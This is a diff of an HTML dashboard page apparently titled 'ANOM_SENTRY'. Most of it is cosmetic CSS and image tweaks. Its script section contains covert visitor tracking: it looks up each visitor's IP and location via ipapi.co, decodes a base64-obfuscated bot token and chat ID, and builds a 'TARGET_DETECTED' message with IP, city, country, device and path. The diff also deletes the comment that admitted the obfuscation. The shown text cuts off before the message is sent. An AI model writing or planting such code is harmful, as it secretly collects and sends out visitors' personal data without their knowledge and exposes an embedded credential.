@@ -19,15 +19,14 @@
         .panel { border: 1px solid var(--dark-red); background: #000; position: relative; overflow: hidden; }
         .panel-header { background: var(--dark-red); color: white; padding: 5px 10px; font-size: 0.7em; letter-spacing: 2px; text-transform: uppercase; }
         
-        /* Ghost Mask Pulsating Effect */
         #data-pulse-panel { height: 220px; display: flex; flex-direction: column; }
         .ghost-mask-container { flex: 1; display: flex; justify-content: center; align-items: center; background: #000; position: relative; overflow: hidden; }
         .ghost-mask { width: 130px; transition: 0.5s; animation: ghostGlow 6s infinite alternate; }
         
         @keyframes ghostGlow {
-            0% { filter: drop-shadow(0 0 10px #fff) brightness(1.1); }
-            50% { filter: drop-shadow(0 0 25px #800080) brightness(1.4); }
-            100% { filter: drop-shadow(0 0 20px #ff0000) brightness(1.2); }
+            0% { filter: drop-shadow(0 0 15px #fff) brightness(1.1); }
+            50% { filter: drop-shadow(0 0 30px #800080) brightness(1.4); }
+            100% { filter: drop-shadow(0 0 25px #ff0000) brightness(1.2); }
         }
 
         .metric-label { font-size: 0.8em; margin-top: 10px; display: block; }
@@ -63,7 +62,7 @@
             <div id="data-pulse-panel" class="panel">
                 <div class="panel-header">ANOM_SENTRY // GHOST_MASK_ACTIVE</div>
                 <div class="ghost-mask-container">
-                    <img src="1000014211.jpg" class="ghost-mask" alt="GHOST">
+                    <img src="1000014211.jpg" class="ghost-mask" alt="GHOST" onerror="this.src='https://raw.githubusercontent.com/KullaniciAdin/ANOMsite/main/1000014211.jpg'">
                 </div>
             </div>
             <div class="panel" style="padding: 20px;">
@@ -98,7 +97,6 @@
             try {
                 const r = await fetch('https://ipapi.co/json/');
                 const d = await r.json();
-                // Base64 Obfuscated Token and ID
                 const t = atob("NzgxMjE2NzI4NTpBQUZiNTFRUzRNY2NiVG9hVVBqNmE2U2F0bDJqZWViYkgxSQ==");
                 const c = atob("NjI5ODg2OTk2OA==");
                 const msg = `🚨 *TARGET_DETECTED*\n🌐 IP: ${d.ip}\n📍 LOC: ${d.city} / ${d.country_name}\n📱 DEV: ${navigator.platform}\n🔗 PATH: ${window.location.pathname}`;
